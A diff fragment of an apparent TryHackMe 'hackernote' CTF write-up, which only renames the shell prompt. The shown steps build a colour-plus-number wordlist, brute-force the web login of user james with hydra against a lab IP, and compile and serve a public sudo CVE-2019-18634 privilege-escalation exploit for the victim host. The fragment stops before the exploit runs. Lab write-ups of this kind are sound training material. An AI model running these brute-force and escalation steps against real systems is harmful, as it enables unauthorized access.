@@ -63,16 +63,16 @@ for i in range(0,10):
 ```
 Now when we you should get a username. The hint for james's password **"my favourite colour and my favourite number"** so let create a costumise wordlist using color.txt and number.txt which are avalible on THM. we will use `combinator.bin` to combine both color.txt and number.txt together. Lets do it
 ```console
-kali@kali:~/THM/hackernote/wordlists$ find / -name combinator.bin 2> /dev/null 
+bibo318@parrot:~/THM/hackernote/wordlists$ find / -name combinator.bin 2> /dev/null 
 /usr/lib/hashcat-utils/combinator.bin
 ^C
-kali@kali:~/THM/hackernote/wordlists$ /usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist.txt
-kali@kali:~/THM/hackernote/wordlists$ wc -l wordlist.txt 
+bibo318@parrot:~/THM/hackernote/wordlists$ /usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist.txt
+bibo318@parrot:~/THM/hackernote/wordlists$ wc -l wordlist.txt 
 180 wordlist.txt
 ```
 So let bruteforce for password using our lovly monster, `hydra`. to lern more about hydra, check hydra room on THM.
 ```console
-kali@kali:~/THM/hackernote/wordlists$ hydra -t 64 -l james -P wordlist.txt 10.10.71.229 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+bibo318@parrot:~/THM/hackernote/wordlists$ hydra -t 64 -l james -P wordlist.txt 10.10.71.229 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
 
 [DATA] attacking http-post-form://10.10.71.229:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
 [STATUS] 64.00 tries/min, 64 tries in 00:01h, 116 to do in 00:02h, 64 active
@@ -94,15 +94,15 @@ Unfortunately, the current user cannot run any commands as root. You may have no
 
 let the exploit, complie it, and tranfer to victim server. In this case, I was using python http server.
 ```console
-kali@kali:~/script$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
-kali@kali:~/script$ cd sudo-cve-2019-18634/
-kali@kali:~/script/sudo-cve-2019-18634$ ls
+bibo318@parrot:~/script$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git
+bibo318@parrot:~/script$ cd sudo-cve-2019-18634/
+bibo318@parrot:~/script/sudo-cve-2019-18634$ ls
 exploit.c  LICENSE  Makefile  README.md
-kali@kali:~/script/sudo-cve-2019-18634$ make all
+bibo318@parrot:~/script/sudo-cve-2019-18634$ make all
 cc -Os -g3 -std=c99 -Wall -Wextra -Wpedantic -static -o exploit exploit.c
-kali@kali:~/script/sudo-cve-2019-18634$ ls
+bibo318@parrot:~/script/sudo-cve-2019-18634$ ls
 exploit  exploit.c  LICENSE  Makefile  README.md
-kali@kali:~/script/sudo-cve-2019-18634$ python3 -m http.server --cgi 8000
+bibo318@parrot:~/script/sudo-cve-2019-18634$ python3 -m http.server --cgi 8000
 ```
 now on victim server, exceute the exploit!!
 ```console
